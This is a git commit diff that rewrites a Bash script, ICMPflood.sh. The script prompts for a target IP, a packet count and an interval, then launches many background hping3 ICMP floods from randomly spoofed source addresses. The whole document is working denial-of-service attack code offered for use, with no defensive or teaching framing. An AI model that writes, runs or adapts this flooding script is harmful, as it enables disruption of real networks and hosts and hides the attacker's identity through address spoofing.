ce7b0b2987fd1f4e6a6c72684f5a72a8870792f9
ObsidianSnake01 <94139410+ObsidianSnake01@users.noreply.github.com>
2024-05-17 10:54:42 -0400

    Update ICMPflood.sh

--- ICMPflood.sh
+++ ICMPflood.sh
@@ -3,11 +3,24 @@
 # Prompt the user for the target's IP address
 read -p "Enter the target's IP address: " target_ip
 
-# Set the spoofed source address
-spoofed_source_address="192.168.1.5"
+# Number of packets to send
+read -p "Enter the number of packets to send: " packet_count
 
-# Send spoofed ping packets to every computer on the network
-ping -c 1 -S $spoofed_source_address $target_ip
+# Interval between packets (in milliseconds)
+read -p "Enter the interval between packets (ms): " interval
 
-# Use the nmap tool to scan the target network
-nmap -sP $target_ip
+# Function to generate a random IP address
+generate_random_ip() {
+    echo "$((RANDOM % 256)).$((RANDOM % 256)).$((RANDOM % 256)).$((RANDOM % 256))"
+}
+
+# Loop to send spoofed ping packets
+for ((i = 1; i <= packet_count; i++)); do
+    spoofed_source_address=$(generate_random_ip)
+    hping3 -1 -a $spoofed_source_address -i u$interval $target_ip &
+done
+
+# Wait for all background jobs to finish
+wait
+
+echo "Flooding completed."
